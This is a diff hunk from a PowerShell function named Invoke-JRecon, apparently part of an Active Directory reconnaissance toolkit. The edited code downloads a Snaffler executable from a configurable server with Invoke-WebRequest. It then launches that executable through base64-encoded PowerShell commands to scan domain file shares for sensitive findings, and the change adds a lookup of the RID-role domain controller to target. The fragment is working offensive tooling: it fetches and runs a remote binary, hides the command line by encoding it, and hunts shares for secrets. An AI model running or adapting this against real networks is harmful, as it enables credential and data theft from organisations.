@@ -1230,13 +1230,16 @@ function Invoke-JRecon{
 		if(Test-Path -Path $ToolOutput\Tools\SnaffPro.exe){}
 		else{Invoke-WebRequest -Uri "$ServerURL/Snaffler_protected.exe" -OutFile "$ToolOutput\Tools\SnaffPro.exe"}
 		if($Domain){
-			$command = "$ToolOutput\Tools\SnaffPro.exe -u -s -d $Domain -o $ToolOutput\$Domain\Shares_Findings.txt"
+  			$TargetServer = Get-DomainController -Domain $Domain | Where-Object {$_.Roles -like "RidRole"} | Select-Object -ExpandProperty Name
+			$command = "$ToolOutput\Tools\SnaffPro.exe -u -s -d $Domain -c $TargetServer -o $ToolOutput\$Domain\Shares_Findings.txt"
 			$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))
 			Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -EncodedCommand $encodedCommand"
 		}
 		else{
 			foreach($AllDomain in $AllDomains){
-				$command = "$ToolOutput\Tools\SnaffPro.exe -u -s -d $AllDomain -o $ToolOutput\$AllDomain\Shares_Findings.txt"
+   				$TargetServer = $null
+       				$TargetServer = Get-DomainController -Domain $AllDomain | Where-Object {$_.Roles -like "RidRole"} | Select-Object -ExpandProperty Name
+				$command = "$ToolOutput\Tools\SnaffPro.exe -u -s -d $AllDomain -c $TargetServer -o $ToolOutput\$AllDomain\Shares_Findings.txt"
 				$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))
 				Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -EncodedCommand $encodedCommand"
 			}
